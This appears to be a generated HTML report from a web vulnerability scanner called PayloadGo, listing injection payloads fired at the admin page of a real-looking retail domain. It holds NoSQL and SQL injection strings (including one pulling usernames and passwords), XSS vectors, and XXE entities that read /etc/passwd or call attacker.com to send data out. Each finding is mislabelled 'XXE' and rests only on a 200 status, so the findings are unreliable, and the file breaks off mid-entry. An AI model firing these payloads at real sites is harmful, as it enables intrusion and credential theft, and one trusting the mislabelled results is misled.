@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PayloadGo Scan Results</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        .vulnerability { background: #f8f9fa; border: 1px solid #dee2e6; margin: 10px 0; padding: 15px; border-radius: 5px; }
+        .payload { font-family: monospace; background: #e9ecef; padding: 5px; border-radius: 3px; }
+        .vuln-type { color: #dc3545; font-weight: bold; }
+        .url { color: #007bff; word-break: break-all; }
+        .response { background: #f8f9fa; padding: 10px; border-radius: 3px; font-family: monospace; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>PayloadGo Scan Results</h1>
+    <p>Found <strong>118</strong> potential vulnerabilities</p>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;this.username.length &gt; 0&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24where%22%3A+%22this.username.length+%3E+0%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 843ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$gt&#34;: &#34;&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24gt%22%3A+%22%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 847ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$ne&#34;: &#34;&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24ne%22%3A+%22%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 866ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;true&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24where%22%3A+%22true%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 869ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;this.username == this.password&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24where%22%3A+%22this.username+%3D%3D+this.password%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 872ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$ne&#34;: 0}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24ne%22%3A+0%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 874ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$or&#34;: [{&#34;username&#34;: {&#34;$ne&#34;: null}}, {&#34;password&#34;: {&#34;$ne&#34;: null}}]}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 457ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$not&#34;: {&#34;username&#34;: null}}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24not%22%3A+%7B%22username%22%3A+null%7D%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 464ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$nor&#34;: [{&#34;username&#34;: null}, {&#34;password&#34;: null}]}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24nor%22%3A+%5B%7B%22username%22%3A+null%7D%2C+%7B%22password%22%3A+null%7D%5D%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 490ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$and&#34;: [{&#34;username&#34;: {&#34;$ne&#34;: null}}, {&#34;password&#34;: {&#34;$ne&#34;: null}}]}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24and%22%3A+%5B%7B%22username%22%3A+%7B%22%24ne%22%3A+null%7D%7D%2C+%7B%22password%22%3A+%7B%22%24ne%22%3A+null%7D%7D%5D%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 552ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$or&#34;: [{&#34;username&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}, {&#34;password&#34;: {&#34;$regex&#34;: &#34;.*&#34;}}]}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24or%22%3A+%5B%7B%22username%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%2C+%7B%22password%22%3A+%7B%22%24regex%22%3A+%22.%2A%22%7D%7D%5D%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 604ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;script&gt;alert(1)&lt;/script&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 643ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$ne&#34;: null}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24ne%22%3A+null%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 1650ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$gt&#34;: 0}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24gt%22%3A+0%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 1680ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$where&#34;: &#34;1==1&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24where%22%3A+%221%3D%3D1%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 1776ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&gt;&lt;img src=x onerror=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 510ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">javascript:alert(1)</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=javascript%3Aalert%281%29</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 478ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 474ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">{&#34;$regex&#34;: &#34;.*&#34;}</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%7B%22%24regex%22%3A+%22.%2A%22%7D</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 1957ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;img src=x onerror=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 662ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;svg onload=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Csvg+onload%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 680ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;input onfocus=alert(1) autofocus&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 428ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;body onload=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cbody+onload%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 577ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;textarea onfocus=alert(1) autofocus&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 436ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 441ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;keygen onfocus=alert(1) autofocus&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 548ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;audio src=x onerror=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 450ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;select onfocus=alert(1) autofocus&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cselect+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 708ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;details open ontoggle=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cdetails+open+ontoggle%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 524ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;table&gt;&lt;td background=&#34;javascript:alert(1)&#34;&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Ctable%3E%3Ctd+background%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 442ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;math&gt;&lt;mi//xlink:href=&#34;data:x,&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 480ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;object data=&#34;javascript:alert(1)&#34;&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cobject+data%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 448ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;marquee onstart=alert(1)&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cmarquee+onstart%3Dalert%281%29%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 719ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;embed src=&#34;javascript:alert(1)&#34;&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3Cembed+src%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 507ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR &#39;1&#39;=&#39;1</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+%271%27%3D%271</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 443ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR &#39;1&#39;=&#39;1&#39; --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+%271%27%3D%271%27+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 464ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR 1=1#</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+1%3D1%23</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 480ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR 1=1 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+1%3D1+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 501ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR 1=1/*</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+1%3D1%2F%2A</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 442ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR &#39;a&#39;=&#39;a</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+%27a%27%3D%27a</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 458ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR &#39;&#39; = &#39;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+%27%27+%3D+%27</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 471ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR sleep(5)--</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+sleep%285%29--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 507ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; AND 1=1 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+AND+1%3D1+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 470ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; AND 1=2 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+AND+1%3D2+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 488ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; AND sleep(3) --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+AND+sleep%283%29+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 429ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; UNION SELECT 1,2,3 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+UNION+SELECT+1%2C2%2C3+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 445ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; UNION SELECT null, null, null --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+UNION+SELECT+null%2C+null%2C+null+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 467ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; UNION SELECT username, password FROM users --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+UNION+SELECT+username%2C+password+FROM+users+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 492ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">admin&#39; or &#39;1&#39;=&#39;1</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=admin%27+or+%271%27%3D%271</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 451ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#34; OR &#34;1&#34;=&#34;1</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%22+OR+%221%22%3D%221</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 535ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39;) OR (&#39;1&#39;=&#39;1</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27%29+OR+%28%271%27%3D%271</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 524ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">admin&#39;)--</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=admin%27%29--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 501ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#34; AND 1=1 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%22+AND+1%3D1+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 416ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#34; OR sleep(3) --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%22+OR+sleep%283%29+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 442ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">1&#39; AND 1=1 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=1%27+AND+1%3D1+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 403ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#34; AND 1=2 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%22+AND+1%3D2+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 468ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; OR EXISTS(SELECT * FROM users) --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 409ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">1&#39; AND 1=2 --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=1%27+AND+1%3D2+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 453ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&#39; AND EXISTS(SELECT * FROM users WHERE username=&#39;admin&#39;) --</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%27+AND+EXISTS%28SELECT+%2A+FROM+users+WHERE+username%3D%27admin%27%29+--</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 449ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 440ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fhosts%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 439ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;http://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 405ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///proc/version&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fproc%2Fversion%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 487ms</p>
+    </div>
+    <div class="vulnerability">
+        <h3><span class="vuln-type">XXE</span></h3>
+        <p><strong>Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;ftp://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+        <p><strong>URL:</strong> <span class="url">https://lucafaloni.com/admin?q=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22ftp%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+        <p><strong>Status Code:</strong> 200</p>
+        <p><strong>Response Time:</strong> 473ms</p>
+    </div>
+    <div class="vulnerability">
